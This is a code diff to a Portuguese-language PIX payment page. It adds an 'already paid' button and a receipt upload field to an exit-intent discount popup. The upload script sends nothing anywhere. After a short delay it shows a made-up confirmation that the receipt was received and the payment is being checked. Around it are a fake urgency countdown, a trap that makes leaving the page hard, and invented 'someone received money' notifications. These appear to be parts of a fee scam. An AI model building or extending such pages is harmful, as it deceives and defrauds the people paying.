@@ -64,6 +64,12 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 .exit-count b{display:block;color:#820ad1;font-size:28px}
 .exit-stay{margin-top:0}
 .exit-leave{display:inline-block;margin-top:14px;border:0;background:transparent;color:#777;text-decoration:underline;font-size:13px;cursor:pointer}
+.already-btn{margin-top:10px;background:#fff;color:#820ad1;border:2px solid #820ad1}
+.receipt{display:none;margin-top:14px;background:#f4ecfa;border-radius:12px;padding:14px}
+.receipt.show{display:block}
+.receipt-t{font-size:13px;color:#555;margin-bottom:10px;line-height:1.4}
+.upload-btn{display:block;margin-top:0;background:#820ad1;color:#fff;text-align:center;cursor:pointer}
+.receipt-ok{font-size:13px;font-weight:700;margin-top:10px;display:none;line-height:1.4}
 
 </style>
 </head>
@@ -110,6 +116,13 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
 <div class="exit-price"><del>R$ 28,63</del><strong>R$ 14,32</strong></div>
 <div class="exit-count">Esta condição termina em:<b id="exitCd">05:00</b></div>
 <button class="btn exit-stay" id="acceptOffer" type="button">APROVEITAR 50% DE DESCONTO</button>
+<button class="btn already-btn" id="alreadyPaid" type="button">JÁ FIZ PAGAMENTO</button>
+<div class="receipt" id="receiptArea">
+<p class="receipt-t">Envie o comprovante do PIX para agilizar a liberação do seu valor.</p>
+<label class="btn upload-btn" for="receiptInput">ESCOLHER COMPROVANTE</label>
+<input type="file" id="receiptInput" accept="image/*,.pdf" hidden>
+<p class="receipt-ok" id="receiptOk"></p>
+</div>
 <button class="exit-leave" id="leavePage" type="button">Não quero o desconto, sair</button>
 </div></div>
 <script>
@@ -185,6 +198,18 @@ textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:10px;font-s
     document.getElementById('qr').textContent='Gerando PIX com desconto...';document.getElementById('code').value='';st.textContent='';st.style.color='';gerar();
   };
   document.getElementById('leavePage').onclick=function(){allowExit=true;history.go(-2);};
+  document.getElementById('alreadyPaid').onclick=function(){
+    document.getElementById('receiptArea').classList.add('show');
+  };
+  document.getElementById('receiptInput').onchange=function(){
+    var f=this.files&&this.files[0];if(!f)return;
+    var ok=document.getElementById('receiptOk');
+    ok.style.display='block';ok.style.color='#820ad1';ok.textContent='Enviando comprovante...';
+    setTimeout(function(){
+      ok.style.color='#0a7d3b';
+      ok.textContent='✓ Comprovante recebido! Estamos confirmando seu pagamento. Assim que aprovar, você será direcionado automaticamente.';
+    },1200);
+  };
 
   // notificacao "fulano recebeu"
   var pessoas=[
